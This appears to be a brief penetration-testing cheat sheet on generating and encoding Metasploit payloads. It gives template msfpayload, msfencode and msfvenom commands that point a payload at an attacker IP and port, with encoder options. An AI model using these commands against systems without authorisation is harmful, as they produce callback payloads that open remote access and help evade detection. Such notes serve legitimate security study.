### Selecting an Encoder
- **msfpayload** and **msfencode** are located in `/usr/share/framework2/` in Parrot OS and in `/opt/metasploit` in Arch Linux
- **msfpayload**: To create our custom payload
- **msfencode**: To encode it according to the target OS architecture
- **List Encoders**: `show encoders`
- `msfpayload [payload] LHOST=[attacker ip address] LPORT=[attacker port] R | msfencode -b '\x00' -f perl -e [encoder]`

#### Generating Payload
- **Without Encoding**
	- `msfvenom -a [cpu architecture] --platform [platform] -p [payload] LHOST=[attacker ip address] LPORT=[attacker port] -b "\x00" -f perl`
- **With Encoding**
	- `msfvenom -a [cpu architecture] --platform [platform] -p [payload] LHOST=[attacker ip address] LPORT=[attacker port] -b "\x00" -f perl -e [encoder]`
